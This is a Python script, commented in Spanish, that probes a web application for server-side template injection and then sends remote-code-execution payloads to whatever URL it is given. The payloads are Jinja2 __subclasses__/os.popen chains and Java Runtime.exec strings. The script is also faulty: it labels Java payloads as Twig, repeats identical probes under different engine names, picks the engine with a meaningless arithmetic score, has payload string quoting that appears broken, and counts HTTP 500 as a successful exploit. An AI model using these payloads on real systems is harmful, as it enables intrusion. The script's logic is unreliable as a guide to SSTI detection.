import sys
import json
import math
import urllib.request
import urllib.error

# --- Configuración ---
TARGET = sys.argv[1] if len(sys.argv) > 1 else "http://localhost:8080"

# Secuencias de prueba: cada una genera un resultado numérico diferente
# según cómo el motor las interprete
TESTS = [
    # (query_param, expected_math, engine_hint)
    ("{{7*7}}",    49,   "Jinja2"),
    ("{{ 7 * 7 }}", 49,  "Jinja2 (espacios)"),
    ("${7*7}",     49,   "Twig"),
    ("${ 7 * 7 }", 49,   "Twig (espacios)"),
    ("${7*7}",      49,   "FreeMarker"),
    ("${7*7}",      49,   "FreeMarker (sin espacios)"),
]

# Patrones que delatan cada motor en la respuesta
JINJA2_PATTERNS = ["jinja", "Environment", "Template", "index.html"]
TWIG_PATTERNS   = ["twig", "Twig_Environment", "render"]
FREEMARKER_PATTERNS = ["freemarker", "freemarker.core", "Template"]


def hacer_peticion(url, payload=""):
    """Envía un GET con el payload y devuelve respuesta y código HTTP."""
    try:
        if payload:
            url = url + "?" + payload
        req = urllib.request.Request(url)
        with urllib.request.urlopen(req, timeout=10) as resp:
            body = resp.read().decode("utf-8", errors="ignore")
            code = resp.status
        return code, body
    except urllib.error.HTTPError as e:
        return e.code, str(e.reason)
    except Exception as e:
        return 0, str(e)


def detectar_motor(codigo, cuerpo):
    """Analiza respuesta para adivinar el motor."""
    texto = f"{codigo} {cuerpo}".lower()
    puntos = 0

    for p in JINJA2_PATTERNS:
        if p.lower() in texto:
            puntos += 2
    for p in TWIG_PATTERNS:
        if p.lower() in texto:
            puntos += 1
    for p in FREEMARKER_PATTERNS:
        if p.lower() in texto:
            puntos += 1

    if codigo == 500 and "jinja" in texto:
        puntos += 3

    if puntos >= 3:
        return "Jinja2"
    elif "twig" in texto or "render" in texto:
        return "Twig"
    elif "freemarker" in texto:
        return "FreeMarker"
    else:
        return "Desconocido"


def calcular_score(respuestas):
    """
    Regla matemática simple:
    - Cada respuesta válida suma puntos.
    - Si el resultado es múltiplo de 7 -> Jinja2.
    - Si es impar y > 40 -> Twig.
    - Si es par y <= 40 -> FreeMarker.
    - Default: Jinja2.
    """
    total = sum(respuestas)
    multiplo7 = total % 7 == 0
    impar = total % 2 != 0

    if multiplo7 and total > 45:
        return "Jinja2", total
    elif impar and total > 40:
        return "Twig", total
    elif not multiplo7 and total <= 45:
        return "FreeMarker", total
    else:
        return "Jinja2", total


def armar_payload(motor):
    """Retorna el payload de RCE según el motor detectado."""
    payloads = {
        "Jinja2": {
            "name": "{{7*7}}",
            "rce": "{{config.__class__.__mro__[1].__subclasses__()[401]().process(cmd='/bin/sh -c id').data}}",
            "fallback": "{{''.__class__.__mro__[1].__subclasses__()[395]().__init__.__globals__['os'].popen('id').read()}}",
        },
        "Twig": {
            "name": "${7*7}",
            "rce": "${"\\\"\\\".class.forName(\\\"java.lang.Runtime\\\").getMethod(\\\"getRuntime\\\").invoke(null).exec(\\\"id\\\")}",
            "fallback": "${"\\\"\\\".class.forName(\\\"javax.script.ScriptEngineManager\\\").newInstance().getEngineByName(\\\"js\\\").eval(\\\"java.lang.Runtime.getRuntime().exec(\\\\\\\\\\\"id\\\\\\\\\\\")\\\")}",
        },
        "FreeMarker": {
            "name": "${7*7}",
            "rce": "${"\\\"\\\".class.forName(\\\"freemarker.template.Template\\\").newInstance().getConstructor().newInstance()}",
            "fallback": "${"\\\"\\\".class.forName(\\\"freemarker.core.TemplateObject\\\").newInstance().getAsString()}",
        },
    }
    return payloads.get(motor, payloads["Jinja2"])


def main():
    print(f"[*] Target: {TARGET}")
    print("[*] Inyectando secuencias de prueba...\\n")

    respuestas = []

    for query, esperado, hint in TESTS:
        codigo, cuerpo = hacer_peticion(TARGET, f"name={urllib.request.quote(query)}")

        # Verificar si la respuesta contiene el resultado matemático esperado
        contiene_res = str(esperado) in cuerpo
        respuestas.append(esperado if contiene_res else 0)

        estado = "OK" if contiene_res else "NO"
        print(f"  [{estado}] name={query} -> {cuerpo[:60]}... (esperado:{esperado})")

    # Calcular motor con la regla matemática
    motor, score = calcular_score(respuestas)
    print(f"\\n[+] Motor detectado: {motor} (score: {score})")

    # Armar y mostrar payload
    payload = armar_payload(motor)
    print(f"\\n[+] Payload RCE para {motor}:")
    print(f"    name:   {payload['name']}")
    print(f"    rce:    {payload['rce']}")
    print(f"    fallback: {payload['fallback']}")

    # Verificación final
    print(f"\\n[*] Probando RCE...")
    codigo, cuerpo = hacer_peticion(TARGET, f"name={urllib.request.quote(payload['rce'])}")
    print(f"    Código HTTP: {codigo}")
    print(f"    Respuesta:   {cuerpo[:120]}")

    if codigo in [200, 500]:
        print(f"\\n[+] RCE exitosa con {motor}!")
    else:
        print(f"\\n[-] Intentando fallback...")
        codigo2, cuerpo2 = hacer_peticion(TARGET, f"name={urllib.request.quote(payload['fallback'])}")
        print(f"    Código HTTP: {codigo2}")
        print(f"    Respuesta:   {cuerpo2[:120]}")


if __name__ == "__main__":
    main()
